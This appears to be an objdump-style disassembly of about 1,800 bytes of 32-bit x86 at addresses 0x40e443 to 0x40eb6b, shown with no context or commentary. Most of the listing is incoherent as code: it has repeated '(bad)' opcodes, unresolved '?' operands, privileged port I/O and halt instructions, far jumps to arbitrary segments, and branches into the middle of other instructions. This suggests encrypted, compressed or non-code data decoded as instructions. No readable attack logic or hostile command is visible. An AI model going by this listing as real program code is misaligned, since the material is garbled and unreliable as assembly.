  40e443:	jmp    0x25377f30
  40e448:	jbe    0x40e4ac
  40e44a:	adc    dh,BYTE PTR [edx+0x0]
  40e44d:	test   DWORD PTR [esi],0xd9e2c209
  40e453:	test   eax,0x8d7a591
  40e458:	ror    BYTE PTR [edx+esi*2+0x3c],cl
  40e45c:	addr16 cmp edx,esi
  40e45f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e460:	mov    ds:0xbb3b8e6d,eax
  40e465:	je     0x40e4c1
  40e467:	fsincos 
  40e469:	sbb    eax,0x26950a83
  40e46e:	jg     0x40e3fd
  40e470:	cpuid  
  40e472:	inc    eax
  40e473:	sbb    eax,edx
  40e475:	push   edi
  40e476:	pusha  
  40e477:	aad    0x63
  40e479:	mov    al,0x89
  40e47b:	xchg   edx,eax
  40e47c:	out    0xb3,al
  40e47e:	ds stos DWORD PTR es:[edi],eax
  40e480:	jmp    0xdc67619b
  40e485:	addr16 inc esp
  40e487:	add    bh,al
  40e489:	pop    ss
  40e48a:	xor    DWORD PTR [edi-0x2df3e5d6],edx
  40e490:	add    ecx,ecx
  40e492:	sbb    eax,0x259e895f
  40e497:	mov    ebx,0x482c84f
  40e49c:	and    eax,0x737a933c
  40e4a1:	push   eax
  40e4a2:	mov    dl,0xc1
  40e4a4:	mov    eax,0x5831af5f
  40e4a9:	and    al,0xd9
  40e4ab:	adc    edi,DWORD PTR [ecx+0x5c]
  40e4ae:	repnz mov ch,0x23
  40e4b1:	dec    esp
  40e4b2:	and    BYTE PTR [esi-0x13],ch
  40e4b5:	push   cs
  40e4b6:	or     dh,BYTE PTR [ecx]
  40e4b8:	dec    ebp
  40e4b9:	mov    bh,0x5c
  40e4bb:	hlt    
  40e4bc:	ins    DWORD PTR es:[edi],dx
  40e4bd:	cmp    ebx,esi
  40e4bf:	pop    edx
  40e4c0:	jno    0x40e526
  40e4c2:	ret    0x11c1
  40e4c5:	ret    0xfc4c
  40e4c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4c9:	jbe    0x40e4ac
  40e4cb:	jle    0x40e4eb
  40e4cd:	push   es
  40e4ce:	les    edi,FWORD PTR [eax]
  40e4d0:	push   ss
  40e4d1:	(bad)  
  40e4d2:	addr16 lahf 
  40e4d4:	sbb    BYTE PTR [edx-0xe],0x26
  40e4d8:	outs   dx,BYTE PTR ds:[esi]
  40e4d9:	(bad)  
  40e4da:	out    dx,al
  40e4db:	and    cl,BYTE PTR [eax+0x63361874]
  40e4e1:	outs   dx,DWORD PTR ds:[esi]
  40e4e2:	adc    dh,ch
  40e4e4:	lock pop ebp
  40e4e6:	outs   dx,DWORD PTR cs:[esi]
  40e4e8:	sbb    DWORD PTR [ecx],esp
  40e4ea:	scas   al,BYTE PTR es:[edi]
  40e4eb:	pop    ecx
  40e4ec:	cmc    
  40e4ed:	call   0xdae7d3e6
  40e4f2:	sub    dl,BYTE PTR [ebx+0x328e6832]
  40e4f8:	push   cs
  40e4f9:	dec    eax
  40e4fa:	xor    eax,0xdca6404c
  40e4ff:	add    BYTE PTR fs:[esi+0x721886f0],0x4c
  40e507:	adc    edi,ebp
  40e509:	repz xor eax,0xa65297f2
  40e50f:	jmp    0x40e4c9
  40e511:	mov    ?,ebp
  40e513:	jle    0x40e4eb
  40e515:	popf   
  40e516:	ret    0x5d31
  40e519:	and    al,0x50
  40e51b:	fsubr  DWORD PTR [ebx+0x44503044]
  40e521:	sbb    al,ah
  40e523:	shr    BYTE PTR [esp+ebp*2],0x6f
  40e527:	inc    edi
  40e528:	aam    0xf2
  40e52a:	imul   dh
  40e52c:	dec    edi
  40e52d:	bound  ecx,QWORD PTR [ebp+ebp*4-0x3b107e2]
  40e534:	jge    0x40e592
  40e536:	loop   0x40e5af
  40e538:	pop    ss
  40e539:	(bad)  
  40e53a:	jmp    0xa786:0xbdee5733
  40e541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e542:	pop    ebx
  40e543:	xchg   esi,eax
  40e544:	xlat   BYTE PTR ds:[ebx]
  40e545:	paddusb mm7,mm1
  40e548:	lahf   
  40e549:	fwait
  40e54a:	fs in  eax,0xa2
  40e54d:	mov    ds:0xc978afbf,al
  40e552:	inc    esp
  40e553:	popf   
  40e554:	rcl    al,cl
  40e556:	loopne 0x40e5d1
  40e558:	fs pushf 
  40e55a:	fist   DWORD PTR gs:[ecx+0x58]
  40e55e:	xchg   esp,eax
  40e55f:	push   ebx
  40e560:	dec    ecx
  40e561:	push   es
  40e562:	stos   BYTE PTR es:[edi],al
  40e563:	cs (bad) 
  40e565:	cmc    
  40e566:	popf   
  40e567:	or     esi,ebp
  40e569:	ret    
  40e56a:	sbb    ebx,DWORD PTR [edx-0x7c]
  40e56d:	mov    dh,0x30
  40e56f:	jmp    0xce5a:0x273d7d6
  40e576:	iret   
  40e577:	imul   eax,DWORD PTR [esi+0x5f01a359],0xffffffa6
  40e57e:	push   es
  40e57f:	ret    
  40e580:	jmp    0x40e5d0
  40e582:	(bad)  
  40e583:	fcomp  QWORD PTR [eax-0x3a5aece7]
  40e589:	mov    ss,eax
  40e58b:	ror    BYTE PTR [edi+ebp*1],0xcd
  40e58f:	jnp    0x40e515
  40e591:	out    0xc3,al
  40e593:	push   ebx
  40e594:	or     al,0x5d
  40e596:	jns    0x40e541
  40e598:	jns    0x40e5f9
  40e59a:	rol    BYTE PTR [edx+0x368b2d55],0x96
  40e5a1:	call   0x78f7:0xfe81a672
  40e5a8:	icebp  
  40e5a9:	stos   BYTE PTR es:[edi],al
  40e5aa:	mov    ebx,0xa90b8548
  40e5af:	cmp    eax,0x2d3861be
  40e5b4:	scas   eax,DWORD PTR es:[edi]
  40e5b5:	mov    cl,0xc1
  40e5b7:	inc    esp
  40e5b8:	pop    ecx
  40e5b9:	je     0x40e5db
  40e5bb:	fldcw  WORD PTR ds:0xb6defdb7
  40e5c1:	mov    ah,0xe7
  40e5c3:	into   
  40e5c4:	push   ebp
  40e5c5:	cmp    DWORD PTR [edx+0x7c],0xfffffff6
  40e5c9:	push   esp
  40e5ca:	xchg   esi,eax
  40e5cb:	pop    ebp
  40e5cc:	push   edi
  40e5cd:	in     al,dx
  40e5ce:	leave  
  40e5cf:	shr    ebx,cl
  40e5d1:	jae    0x40e5d2
  40e5d3:	lods   al,BYTE PTR ds:[esi]
  40e5d4:	addr16 mov bh,0xe7
  40e5d7:	sahf   
  40e5d8:	sub    DWORD PTR [eax+0x4],eax
  40e5db:	pop    ecx
  40e5dc:	std    
  40e5dd:	mov    dl,0x65
  40e5df:	jmp    0x40e5a7
  40e5e1:	pop    ecx
  40e5e2:	rcl    DWORD PTR [edi],1
  40e5e4:	icebp  
  40e5e5:	imul   esi,DWORD PTR [ebx+0x1d030c06],0xffffff81
  40e5ec:	cmp    bh,BYTE PTR [ebx]
  40e5ee:	jge    0x40e664
  40e5f0:	popf   
  40e5f1:	jbe    0x40e63e
  40e5f3:	aas    
  40e5f4:	mov    ah,0x3d
  40e5f6:	add    ecx,ebx
  40e5f8:	mov    edi,0x3b9b735b
  40e5fd:	pop    esi
  40e5fe:	call   0x8110a202
  40e603:	pop    ecx
  40e604:	(bad)  
  40e605:	hlt    
  40e606:	inc    edi
  40e607:	jnp    0x40e5d4
  40e609:	adc    eax,0x350a60b0
  40e60e:	popf   
  40e60f:	inc    eax
  40e610:	test   BYTE PTR [ebx+0x35],cl
  40e613:	out    0xfd,eax
  40e615:	out    0x9d,al
  40e617:	jnp    0x40e61e
  40e619:	dec    esi
  40e61a:	lock dec eax
  40e61c:	pop    ecx
  40e61d:	jns    0x40e60a
  40e61f:	mov    edi,0xe2a5b2c1
  40e624:	fwait
  40e625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e626:	or     BYTE PTR [ebp+0x75],bh
  40e629:	and    al,0x6f
  40e62b:	sub    eax,0x907d5e40
  40e630:	push   ebx
  40e631:	or     DWORD PTR [edi+0x62e746],esi
  40e637:	les    esp,FWORD PTR [edx-0x16]
  40e63a:	scas   al,BYTE PTR es:[edi]
  40e63b:	sar    DWORD PTR [eax],1
  40e63d:	sbb    eax,0xa17e18f4
  40e642:	mov    eax,0x7ed85dc3
  40e647:	dec    esi
  40e648:	mov    ?,WORD PTR [ebp-0x2c766790]
  40e64e:	add    BYTE PTR [edi],dl
  40e650:	push   ecx
  40e651:	sub    BYTE PTR [eax],al
  40e653:	stos   BYTE PTR es:[edi],al
  40e654:	dec    ecx
  40e655:	and    esp,ebp
  40e657:	push   ebp
  40e658:	ja     0x40e662
  40e65a:	and    BYTE PTR fs:[ecx-0x20],al
  40e65e:	icebp  
  40e65f:	pop    ebx
  40e660:	icebp  
  40e661:	les    ecx,FWORD PTR [eax+0x449fadea]
  40e667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e668:	adc    al,0x1a
  40e66a:	scas   eax,DWORD PTR es:[edi]
  40e66b:	fisub  DWORD PTR [ecx]
  40e66d:	aas    
  40e66e:	or     al,0xd0
  40e670:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e671:	cmp    DWORD PTR [eax],0x84d809d3
  40e677:	mov    bl,0xa7
  40e679:	inc    ebx
  40e67a:	(bad)  
  40e67b:	cmp    DWORD PTR [edi-0x4bfc6fc5],esi
  40e681:	cmp    ecx,eax
  40e683:	aaa    
  40e684:	and    edx,edi
  40e686:	push   ss
  40e687:	pop    ds
  40e688:	inc    ebp
  40e689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e68a:	adc    DWORD PTR gs:[esi-0x4cf12efc],0xffffffb1
  40e692:	sbb    edx,0xa1b80f00
  40e698:	(bad)  
  40e699:	xor    BYTE PTR [ecx-0x15cbfdec],bl
  40e69f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6a0:	mov    ch,0x2d
  40e6a2:	pop    esi
  40e6a3:	and    eax,0x126f27e0
  40e6a8:	neg    edi
  40e6aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6ab:	loope  0x40e671
  40e6ad:	(bad)  
  40e6ae:	bound  esp,QWORD PTR [ecx-0x50b19a8c]
  40e6b4:	shl    DWORD PTR [edi-0x3f],0xd7
  40e6b8:	adc    edi,ebx
  40e6ba:	bound  edx,QWORD PTR [ebx+0x2944070d]
  40e6c0:	aas    
  40e6c1:	sbb    bh,0xec
  40e6c4:	jge    0x40e6d6
  40e6c6:	jns    0x40e719
  40e6c8:	xchg   ebx,eax
  40e6c9:	int    0x8e
  40e6cb:	repnz add BYTE PTR [ebx+esi*8-0x4e92a85e],dh
  40e6d3:	push   ss
  40e6d4:	inc    esi
  40e6d5:	rcl    BYTE PTR [edx-0x42],0x3
  40e6d9:	sub    eax,0xd9aa0706
  40e6de:	shr    esi,cl
  40e6e0:	test   BYTE PTR [edx],bh
  40e6e2:	inc    eax
  40e6e3:	mov    ah,0x9c
  40e6e5:	dec    ebp
  40e6e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6e7:	jo     0x40e691
  40e6e9:	js     0x40e723
  40e6eb:	sub    eax,0xd6704ff7
  40e6f0:	jg     0x40e68e
  40e6f2:	sub    eax,0x2030b25a
  40e6f7:	xchg   edx,eax
  40e6f8:	in     al,0xfd
  40e6fa:	(bad)  [ecx]
  40e6fc:	(bad)  
  40e6fd:	sbb    al,0x9a
  40e6ff:	jnp    0x40e757
  40e701:	add    al,dl
  40e703:	jo     0x40e77f
  40e705:	add    DWORD PTR [eax-0xfec21c9],ecx
  40e70b:	rcr    ebx,1
  40e70d:	retf   
  40e70e:	int3   
  40e70f:	and    DWORD PTR [edi],edx
  40e711:	scas   eax,DWORD PTR es:[edi]
  40e712:	pop    ebx
  40e713:	cmp    ah,dl
  40e715:	pop    esi
  40e716:	(bad)  
  40e717:	cmp    BYTE PTR [eax+0x30],dh
  40e71a:	push   ebx
  40e71b:	xchg   edi,eax
  40e71c:	stos   DWORD PTR es:[edi],eax
  40e71d:	mov    edx,DWORD PTR [edx]
  40e71f:	out    dx,al
  40e720:	sbb    edi,DWORD PTR [ebx]
  40e722:	jecxz  0x40e713
  40e724:	loope  0x40e6e9
  40e726:	(bad)  
  40e727:	lods   al,BYTE PTR ds:[esi]
  40e728:	pop    esi
  40e729:	or     eax,0x6a7a1cb
  40e72e:	sbb    BYTE PTR [ecx],dh
  40e730:	pop    ss
  40e731:	mov    bl,0x15
  40e733:	sahf   
  40e734:	dec    eax
  40e735:	xchg   edi,eax
  40e736:	aad    0x76
  40e738:	or     DWORD PTR ds:0x659f25eb,0xffffffc6
  40e73f:	sti    
  40e740:	aad    0x54
  40e742:	push   ss
  40e743:	inc    eax
  40e744:	cmp    esp,0x57
  40e747:	xlat   BYTE PTR ds:[ebx]
  40e748:	(bad)  
  40e74a:	push   ss
  40e74b:	test   DWORD PTR [edi],esp
  40e74d:	leave  
  40e74e:	add    esi,DWORD PTR [eax]
  40e750:	stos   DWORD PTR es:[edi],eax
  40e751:	push   esp
  40e752:	xor    eax,DWORD PTR [eax+0x5d]
  40e755:	outs   dx,BYTE PTR ds:[esi]
  40e756:	lea    edi,[ebp+0x2879f3e8]
  40e75c:	dec    ebp
  40e75d:	mov    eax,0x52c6f7c7
  40e762:	sbb    dh,BYTE PTR [esp+esi*8]
  40e765:	out    0xba,eax
  40e767:	xor    BYTE PTR [esi+edi*8+0x52],dh
  40e76b:	inc    esi
  40e76c:	mov    dl,0xe9
  40e76e:	pop    esi
  40e76f:	dec    edx
  40e770:	and    al,bh
  40e772:	dec    eax
  40e773:	inc    esp
  40e774:	xchg   ebp,eax
  40e775:	sahf   
  40e776:	sbb    eax,0x254253
  40e77b:	or     al,0x2c
  40e77d:	xchg   edx,eax
  40e77e:	adc    eax,ecx
  40e780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e781:	imul   edi,DWORD PTR [ebp+0x1c],0x1b2f139e
  40e788:	dec    esi
  40e789:	aas    
  40e78a:	inc    ecx
  40e78b:	dec    esi
  40e78c:	xlat   BYTE PTR ds:[ebx]
  40e78d:	icebp  
  40e78e:	(bad)  
  40e78f:	pop    ds
  40e790:	pop    eax
  40e791:	ret    
  40e792:	dec    edi
  40e793:	inc    eax
  40e794:	mov    eax,0x3246d91f
  40e799:	retf   0x4607
  40e79c:	adc    ebp,esi
  40e79e:	inc    eax
  40e79f:	(bad)  
  40e7a0:	in     al,dx
  40e7a1:	les    ebp,FWORD PTR [esi]
  40e7a3:	mov    dh,0x49
  40e7a5:	xchg   esi,eax
  40e7a6:	push   esp
  40e7a7:	pop    ebx
  40e7a8:	pop    edi
  40e7a9:	in     al,dx
  40e7aa:	std    
  40e7ab:	minps  xmm2,XMMWORD PTR [edx]
  40e7ae:	sbb    eax,0x63135113
  40e7b3:	mov    WORD PTR [edi-0x2e],ss
  40e7b6:	xor    al,0x82
  40e7b8:	jle    0x40e81e
  40e7ba:	imul   edx,DWORD PTR [edi-0x77e383a3],0x6c095a29
  40e7c4:	bnd jno 0x40e81d
  40e7c7:	std    
  40e7c8:	push   esp
  40e7c9:	sbb    eax,0x1e73df30
  40e7ce:	addr16 cld 
  40e7d0:	xchg   ecx,eax
  40e7d1:	sbb    al,0xb0
  40e7d3:	xor    esi,DWORD PTR [edi]
  40e7d5:	int    0x8d
  40e7d7:	aam    0x22
  40e7d9:	lds    esi,FWORD PTR [ecx]
  40e7db:	mov    ah,0x62
  40e7dd:	add    eax,0x461c2254
  40e7e2:	enter  0x62ff,0xa5
  40e7e6:	(bad)  
  40e7e7:	xor    eax,0x4a95b64c
  40e7ec:	je     0x40e854
  40e7ee:	dec    BYTE PTR [edx+0x6ac6bced]
  40e7f4:	fs out 0xa0,eax
  40e7f7:	mov    bh,0x69
  40e7f9:	into   
  40e7fa:	pop    ecx
  40e7fb:	cmp    bl,ah
  40e7fd:	pop    edx
  40e7fe:	cmp    eax,0xea4612f0
  40e803:	shl    dl,1
  40e805:	ins    DWORD PTR es:[edi],dx
  40e806:	pop    ds
  40e807:	sub    BYTE PTR ds:0x3db779cc,bl
  40e80d:	jbe    0x40e7b2
  40e80f:	mov    ecx,0xb1b9a929
  40e814:	into   
  40e815:	xchg   ecx,eax
  40e816:	lock dec ecx
  40e818:	and    eax,DWORD PTR [ecx+esi*8+0x244b95de]
  40e81f:	scas   al,BYTE PTR es:[edi]
  40e820:	arpl   WORD PTR [edx+0x6a2b2b6a],ax
  40e826:	iret   
  40e827:	popf   
  40e828:	or     DWORD PTR [eax-0x2f],edx
  40e82b:	into   
  40e82c:	jbe    0x40e832
  40e82e:	rol    ebx,cl
  40e830:	call   0xb04d:0x9b75f835
  40e837:	daa    
  40e838:	push   es
  40e839:	or     DWORD PTR [ebx+0x55],ecx
  40e83c:	mov    eax,ds:0xc789b4ec
  40e841:	ja     0x40e878
  40e843:	dec    ebx
  40e844:	dec    edi
  40e845:	push   ebp
  40e846:	iret   
  40e847:	cs cmp dh,al
  40e84a:	push   ecx
  40e84b:	retf   0xd774
  40e84e:	cmp    eax,0xe89f27e1
  40e853:	js     0x40e8a5
  40e855:	and    cl,BYTE PTR [edi-0x3ee6a051]
  40e85b:	sbb    DWORD PTR [ebx+0x2d],ecx
  40e85e:	xchg   ecx,eax
  40e85f:	mov    dl,0x72
  40e861:	test   al,0xf
  40e863:	rcr    DWORD PTR [edi+0x61],1
  40e866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e867:	(bad)  [edx+0x7f2300f5]
  40e86d:	sub    dl,dh
  40e86f:	popa   
  40e870:	dec    edx
  40e871:	mov    esp,0x7a8ebdec
  40e876:	inc    ebp
  40e877:	int3   
  40e878:	xor    eax,0x5ce05379
  40e87d:	fbld   TBYTE PTR [ecx+edi*4+0x71]
  40e881:	test   eax,0x3d0d7520
  40e886:	call   0xbb5dbf0d
  40e88b:	or     eax,0xc3f34bf7
  40e890:	adc    DWORD PTR [esi+0x51],eax
  40e893:	out    0xb,eax
  40e895:	jmp    0x40e8e3
  40e897:	into   
  40e898:	and    dl,ch
  40e89a:	(bad)  
  40e89b:	sbb    dl,BYTE PTR [esp+ecx*1]
  40e89e:	jge    0x40e884
  40e8a0:	xchg   edx,eax
  40e8a1:	cmc    
  40e8a2:	cwde   
  40e8a3:	js     0x40e82b
  40e8a5:	xchg   BYTE PTR [eax-0x66],bh
  40e8a8:	outs   dx,BYTE PTR ds:[esi]
  40e8a9:	sub    DWORD PTR [edi-0x2e],esp
  40e8ac:	hlt    
  40e8ad:	push   edx
  40e8ae:	ds jo  0x40e927
  40e8b1:	jmp    FWORD PTR [edx-0x6]
  40e8b4:	xchg   esi,eax
  40e8b5:	add    eax,esp
  40e8b7:	call   0xc590:0x15b60c20
  40e8be:	data16 cli 
  40e8c0:	inc    ecx
  40e8c1:	hlt    
  40e8c2:	pop    es
  40e8c3:	cli    
  40e8c4:	je     0x40e90a
  40e8c6:	pushf  
  40e8c7:	test   bl,dh
  40e8c9:	mov    ah,0x45
  40e8cb:	idiv   DWORD PTR [eax]
  40e8cd:	les    ebx,FWORD PTR [esi]
  40e8cf:	jae    0x40e90d
  40e8d1:	and    al,0x80
  40e8d3:	imul   esi,DWORD PTR [ecx-0x2e067fbe],0xffffffff
  40e8da:	jae    0x40e890
  40e8dc:	xchg   esp,eax
  40e8dd:	pop    esi
  40e8de:	mov    eax,0x1a5918b6
  40e8e3:	nop
  40e8e4:	xor    al,al
  40e8e6:	hlt    
  40e8e7:	dec    eax
  40e8e8:	or     al,0xa6
  40e8ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8eb:	into   
  40e8ec:	imul   esp,DWORD PTR [ecx+edi*8],0xffffff9b
  40e8f0:	je     0x40e922
  40e8f2:	call   0xa12df8ca
  40e8f7:	mov    ecx,0xe41132ae
  40e8fc:	stos   BYTE PTR es:[edi],al
  40e8fd:	gs cdq 
  40e8ff:	pop    ebp
  40e900:	sub    al,BYTE PTR [edi-0x99e8a7c]
  40e906:	mov    esp,0x2e98bd82
  40e90b:	ins    DWORD PTR es:[edi],dx
  40e90c:	add    eax,0x649b31ad
  40e911:	inc    edx
  40e912:	dec    ecx
  40e913:	pop    es
  40e914:	xchg   ecx,eax
  40e915:	data16 in al,dx
  40e917:	imul   edx,DWORD PTR ds:[ecx+0x5c],0xffffffb6
  40e91c:	and    edi,esp
  40e91e:	jecxz  0x40e90b
  40e920:	cwde   
  40e921:	scas   al,BYTE PTR es:[edi]
  40e922:	push   es
  40e923:	sbb    eax,0x2eb0e58d
  40e928:	mov    edx,0xa1cdd2d5
  40e92d:	and    ch,BYTE PTR ds:0x6ab2d43d
  40e933:	out    0x2a,al
  40e935:	and    BYTE PTR [ebx+0x26],cl
  40e938:	push   ecx
  40e939:	xor    eax,0x624ad9fc
  40e93e:	daa    
  40e93f:	xchg   ebx,eax
  40e940:	dec    esp
  40e941:	cmc    
  40e942:	mov    ebp,0xc5375a8d
  40e947:	xchg   edi,eax
  40e948:	mov    al,0xbf
  40e94a:	jmp    0x2fd6b5a2
  40e94f:	xor    BYTE PTR [edi+0x79],ch
  40e952:	adc    ch,BYTE PTR [edi-0x11]
  40e955:	adc    eax,0x2bc1ed4b
  40e95a:	(bad)  
  40e95c:	jmp    0x40e90f
  40e95e:	(bad)  
  40e95f:	outs   dx,DWORD PTR ds:[esi]
  40e960:	(bad)  
  40e962:	repnz push eax
  40e964:	sbb    al,0xa1
  40e966:	mov    esi,edi
  40e968:	stc    
  40e969:	mov    al,ds:0xb9860961
  40e96e:	out    0xd0,eax
  40e970:	pop    es
  40e971:	xor    eax,0xb80d970b
  40e976:	mov    dl,0x4d
  40e978:	int3   
  40e979:	mov    ds:0x19f4677c,eax
  40e97e:	mov    bl,BYTE PTR [esi]
  40e980:	add    DWORD PTR [eax],ecx
  40e982:	clc    
  40e983:	not    BYTE PTR [edi]
  40e985:	sub    esp,DWORD PTR [esi-0x4f05564d]
  40e98b:	shl    BYTE PTR ds:0x8df005f5,cl
  40e991:	enter  0xbdaf,0x9b
  40e995:	stos   DWORD PTR es:[edi],eax
  40e996:	loopne 0x40e9a0
  40e998:	cmp    al,0x8f
  40e99a:	dec    eax
  40e99b:	xchg   BYTE PTR [esi],cl
  40e99d:	and    eax,0xabb59ddd
  40e9a2:	inc    edx
  40e9a3:	iret   
  40e9a4:	jecxz  0x40e9d2
  40e9a6:	icebp  
  40e9a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9a8:	retf   
  40e9a9:	clc    
  40e9aa:	fwait
  40e9ab:	xor    edx,DWORD PTR [ebp-0x75]
  40e9ae:	int3   
  40e9af:	cld    
  40e9b0:	repz and ah,ah
  40e9b3:	(bad)  
  40e9b4:	or     eax,0xa75efb69
  40e9b9:	jmp    0x40e9ad
  40e9bb:	sub    esp,DWORD PTR [edi+0x56]
  40e9be:	sbb    BYTE PTR gs:[edx-0x684425f1],al
  40e9c5:	rol    DWORD PTR [ecx-0x31],0xa6
  40e9c9:	aad    0xec
  40e9cb:	fwait
  40e9cc:	cmp    BYTE PTR [ebp-0x7fe3a463],cl
  40e9d2:	mov    ds:0xd14449ec,eax
  40e9d7:	dec    esi
  40e9d8:	cmp    eax,esi
  40e9da:	mov    dl,0xb7
  40e9dc:	push   ds
  40e9dd:	inc    edx
  40e9de:	xor    eax,0x33c94344
  40e9e3:	ins    BYTE PTR es:[edi],dx
  40e9e4:	xlat   BYTE PTR ds:[ebx]
  40e9e5:	sar    DWORD PTR [ecx],1
  40e9e7:	jl     0x40e988
  40e9e9:	jnp    0x40e9d7
  40e9eb:	mov    ch,0x6e
  40e9ed:	retf   0x8722
  40e9f0:	outs   dx,DWORD PTR ds:[esi]
  40e9f1:	jmp    FWORD PTR [ecx+0x6e81227f]
  40e9f7:	movups XMMWORD PTR [ecx+0x17],xmm1
  40e9fb:	xor    BYTE PTR [edx+edi*8+0x26e417de],0xac
  40ea03:	(bad)  
  40ea04:	xchg   edx,eax
  40ea05:	hlt    
  40ea06:	ud0    ebx,esi
  40ea09:	mov    ah,0xe2
  40ea0b:	int3   
  40ea0c:	(bad)  
  40ea0d:	ins    DWORD PTR es:[edi],dx
  40ea0e:	xchg   ebx,eax
  40ea0f:	xchg   ecx,eax
  40ea10:	rol    bh,1
  40ea12:	jecxz  0x40ea89
  40ea14:	pop    edi
  40ea15:	ja     0x40e9d2
  40ea17:	mov    ds:0x419619f8,al
  40ea1c:	lods   al,BYTE PTR ds:[esi]
  40ea1d:	mov    ch,0xa8
  40ea1f:	addr16 ds and al,0x2a
  40ea23:	sub    ecx,ebp
  40ea25:	mov    ch,0x19
  40ea27:	jbe    0x40e9ef
  40ea29:	sub    dh,cl
  40ea2b:	dec    ebp
  40ea2c:	retf   
  40ea2d:	push   esi
  40ea2e:	xor    esp,eax
  40ea30:	out    dx,al
  40ea31:	xor    ebx,DWORD PTR [edi]
  40ea33:	lahf   
  40ea34:	mov    al,ds:0x4809cd56
  40ea39:	push   es
  40ea3a:	dec    BYTE PTR [edx-0x2d08847a]
  40ea40:	xor    eax,0x3c539a42
  40ea45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea46:	push   esi
  40ea47:	inc    edi
  40ea48:	pop    ds
  40ea49:	std    
  40ea4a:	jbe    0x40ea7c
  40ea4c:	stos   DWORD PTR es:[edi],eax
  40ea4d:	sbb    BYTE PTR [ebp+0x7d],ch
  40ea50:	idiv   bl
  40ea52:	fs jge 0x40eabd
  40ea55:	jo     0x40ea24
  40ea57:	fcmovb st,st(3)
  40ea59:	sti    
  40ea5a:	dec    ebx
  40ea5b:	and    BYTE PTR [eax-0x281de98],ch
  40ea61:	push   es
  40ea62:	pusha  
  40ea63:	pop    ecx
  40ea64:	(bad)  
  40ea66:	out    0x34,al
  40ea68:	sar    DWORD PTR [edi],0x9
  40ea6b:	dec    eax
  40ea6c:	imul   edi,DWORD PTR [eax-0x3e82af27],0x981640a2
  40ea76:	rol    ecx,cl
  40ea78:	jne    0x40eaa9
  40ea7a:	pop    ecx
  40ea7b:	jbe    0x40ea00
  40ea7d:	pusha  
  40ea7e:	or     DWORD PTR cs:[edx+0x5f],0x6c
  40ea83:	(bad)  
  40ea84:	fcom   QWORD PTR [esi-0x14bcd821]
  40ea8a:	mov    ebp,0x880816c9
  40ea8f:	int3   
  40ea90:	or     dh,BYTE PTR [esp+edx*8-0x4e]
  40ea94:	jmp    0x4c9e2a23
  40ea99:	jmp    FWORD PTR [edx+0xbabf9b1]
  40ea9f:	mov    ebx,0x352e3c79
  40eaa4:	call   0xf343c7e
  40eaa9:	out    dx,al
  40eaaa:	dec    eax
  40eaab:	jl     0x40eb16
  40eaad:	mov    ebp,0x95cbe3ab
  40eab2:	(bad)  
  40eab3:	fwait
  40eab4:	push   0xffffffbb
  40eab6:	outs   dx,BYTE PTR ds:[esi]
  40eab7:	retf   0xca55
  40eaba:	ds popa 
  40eabc:	add    BYTE PTR [ecx+ecx*8],0x88
  40eac0:	jg     0x40eaa9
  40eac2:	mov    ch,0x8f
  40eac4:	pop    ecx
  40eac5:	xchg   DWORD PTR [edi*4-0x4db708c9],ebx
  40eacc:	pop    edi
  40eacd:	push   es
  40eace:	out    dx,eax
  40eacf:	scas   eax,DWORD PTR es:[edi]
  40ead0:	test   DWORD PTR [eax+0x4b3a9de0],esp
  40ead6:	lods   eax,DWORD PTR ds:[esi]
  40ead7:	dec    esi
  40ead8:	stos   BYTE PTR es:[edi],al
  40ead9:	data16 mov ah,0xe3
  40eadc:	(bad)  [eax]
  40eade:	mov    esp,0x438333cd
  40eae3:	bound  eax,QWORD PTR [esp+ecx*8-0x5bb4e849]
  40eaea:	and    eax,0x6fb7c3dd
  40eaef:	ds push es
  40eaf1:	shr    BYTE PTR [esi],cl
  40eaf3:	sbb    eax,0x8a43ac62
  40eaf8:	and    eax,0x9f67fe88
  40eafd:	mov    WORD PTR [edi-0x42],?
  40eb00:	or     cl,BYTE PTR [ebx-0x2b92c0f1]
  40eb06:	dec    ebx
  40eb07:	push   esp
  40eb08:	movntq QWORD PTR [ebp+0x592bf11f],mm0
  40eb0f:	inc    edx
  40eb10:	repz fsubr DWORD PTR [edx-0x68]
  40eb14:	daa    
  40eb15:	mov    bh,0x6b
  40eb17:	or     eax,0xe60fbd1c
  40eb1c:	mov    esp,DWORD PTR [edi]
  40eb1e:	(bad)  
  40eb20:	sbb    DWORD PTR [edi],ebx
  40eb22:	pusha  
  40eb23:	dec    ecx
  40eb24:	aaa    
  40eb25:	cmp    ebx,DWORD PTR [ebp+ebx*2-0x1e394a4]
  40eb2c:	push   es
  40eb2d:	sbb    al,0xc1
  40eb2f:	or     ah,BYTE PTR [ebx-0x49]
  40eb32:	cmp    al,0x7b
  40eb34:	in     eax,dx
  40eb35:	popf   
  40eb36:	loop   0x40eb5e
  40eb38:	dec    edi
  40eb39:	push   0x8aa1bf66
  40eb3e:	add    eax,DWORD PTR [esi]
  40eb40:	call   0x403ba9e8
  40eb45:	xchg   edx,eax
  40eb46:	in     eax,dx
  40eb47:	icebp  
  40eb48:	(bad)  
  40eb49:	xchg   edi,eax
  40eb4a:	pop    esp
  40eb4b:	call   FWORD PTR [esi-0x19]
  40eb4e:	loopne 0x40eaf2
  40eb50:	fwait
  40eb51:	xchg   esi,eax
  40eb52:	mov    eax,0xb9b634c6
  40eb57:	ss pop ebp
  40eb59:	inc    edi
  40eb5a:	cli    
  40eb5b:	imul   ebp,DWORD PTR [esi-0x1a61fd20],0xffffffd1
  40eb62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb63:	mov    ah,0x5e
  40eb65:	rol    BYTE PTR [edx-0x77f7f6a0],cl
  40eb6b:	into   
